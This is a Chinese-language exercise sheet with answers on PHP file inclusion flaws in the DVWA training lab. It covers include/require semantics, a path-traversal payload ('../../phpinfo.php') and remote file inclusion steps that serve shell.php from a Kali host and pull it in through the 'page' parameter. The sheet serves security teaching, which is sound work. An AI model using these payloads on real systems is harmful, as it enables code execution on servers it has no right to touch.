# 文件包含漏洞 大题

基于文档中 File Inclusion 实训题目整理。

---

**环境**：DVWA 漏洞实训平台，File Inclusion 模块，Low 等级。页面通过 URL 参数 `page` 动态引入 php 文件，参数可由用户任意控制。

---

### 题目 1 PHP 包含函数填空

(1) 加载文件失败仅警告、脚本继续运行的函数：**`include()`**

(2) 加载文件失败抛出致命错误、直接终止页面运行的函数：**`require()`**

(3) 重复加载同一文件只会执行一次的函数有两个，分别是 `include_once` 和 **`require_once()`**

> 可以这样理解：
> - `include` = "尽量试试"——失败了也继续跑（给个警告而已）
> - `require` = "必须要有"——没有就崩溃（致命错误，脚本直接停）
> - `_once` = "只来一次"——不管 call 多少次，同一文件只加载一次

---

### 题目 2 本地文件路径遍历载荷填空

当前页面目录：`/DVWA/vulnerabilities/fi/`

(1) `../` 符号代表含义：**切换到当前目录的上一级目录**

(2) 写出跳转两层上级目录，访问根目录 `phpinfo.php` 文件的完整路径载荷：**`../../phpinfo.php`**

> `../` 就像"往上走一层"：
> - `../` = 从 `/DVWA/vulnerabilities/fi/` 回到 `/DVWA/vulnerabilities/`
> - `../../` = 再往上到 `/DVWA/`
> - `../../phpinfo.php` = 从当前目录往上走两级，找到根目录的 phpinfo.php

---

### 题目 3 远程文件包含 RFI 实操步骤填空

攻击机 Kali 地址：192.168.146.110，恶意脚本文件名 shell.php

(1) Kali 开启 Apache 服务完整命令：**`sudo service apache2 start`**

(2) shell.php 内执行 PHP 信息查看的代码：

```php
<?php phpinfo(); ?>
```

(3) DVWA 页面远程包含完整 URL 载荷：**`?page=http://192.168.146.110/shell.php`**

> RFI 像"点了外卖"——服务器（DVWA）从远程地址（Kali）把文件"取回来"并执行。如果这个文件里有恶意代码，就等于攻击者在靶机上执行了任意命令。
